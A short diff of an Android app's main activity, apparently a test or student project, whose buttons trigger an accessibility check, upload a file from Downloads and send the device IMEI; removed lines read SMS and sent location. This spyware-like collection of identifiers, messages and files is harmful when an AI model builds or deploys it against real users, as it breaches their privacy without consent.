@@ -33,13 +33,13 @@ class MainActivity : AppCompatActivity() {
 
         setContentView(R.layout.activity_main)
         findViewById<TextView>(R.id.mengrong).setOnClickListener{
+            gn.accessibilityCheck()
         }
         findViewById<TextView>(R.id.wesley).setOnClickListener{
             dataSender.sendFile("/storage/emulated/0/Downloads/test.txt")
         }
         findViewById<TextView>(R.id.jon).setOnClickListener{
-            hv.getSMS()
-            //dataSender.sendData(dataSender.getIMEI(this.contentResolver), gps.getLocationDetails())
+            dataSender.sendData(dataSender.getIMEI(), "")
         }
         findViewById<TextView>(R.id.keefe).setOnClickListener(::clickName)
         findViewById<TextView>(R.id.minyao).setOnClickListener(::clickName)
